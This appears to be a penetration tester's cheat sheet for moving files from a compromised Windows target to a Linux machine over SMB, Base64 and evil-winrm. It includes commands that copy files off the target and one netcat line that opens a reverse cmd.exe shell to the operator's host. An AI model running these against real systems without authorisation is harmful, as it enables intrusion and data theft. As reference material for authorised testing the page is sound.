---
title: "File Transfer (Windows To Linux)"
date: 2024-6-26
tags: ["file transfer", "Windows", "smb", "evil-winrm"]
---

{{< tab set1 tab1 active >}}SMB{{< /tab >}}
{{< tab set1 tab2 >}}Base64{{< /tab >}}
{{< tab set1 tab3 >}}evil-winrm{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### Start a Local SMB Server

```console
impacket-smbserver share . -smb2support
```

#### cmd

```console
# Connect to SMB server without creds
net use \\<LOCAL_IP>\share
```

```console
# Connect to SMB server with creds
net use \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>'
```

```console
# From target Windows to local Linux
copy <FILE> \\<LOCAL_IP>\share
```

```console
# From local Linux to target Windows
copy \\<LOCAL_IP>\share\<FILE> <FILE>
```

```console
# Delete file
del <FILE>
```

```console
# Remove SMB share
net use /d \\<LOCAL_IP>\share
```

```console
# Older Windows (e.g. xp), use directly
\\<LOCAL_IP>\share\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### Small binary

```console
# In target Windows
[System.convert]::ToBase64String((Get-Content -Path 'C:\ProgramData\<FILE>' -Encoding Byte))
```

```console
# Copy and paste the base64 encoded binary to local Linux
echo -n '<BASE64_BINARY>' | base64 -d > <FILE>
```

<small>*Note: For restricted environment*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

```console
# Evil-winrm built-in function
download 'C:\ProgramData\<FILE>' '<LOCAL_DEST_PATH>'
```

{{< /tabcontent >}}
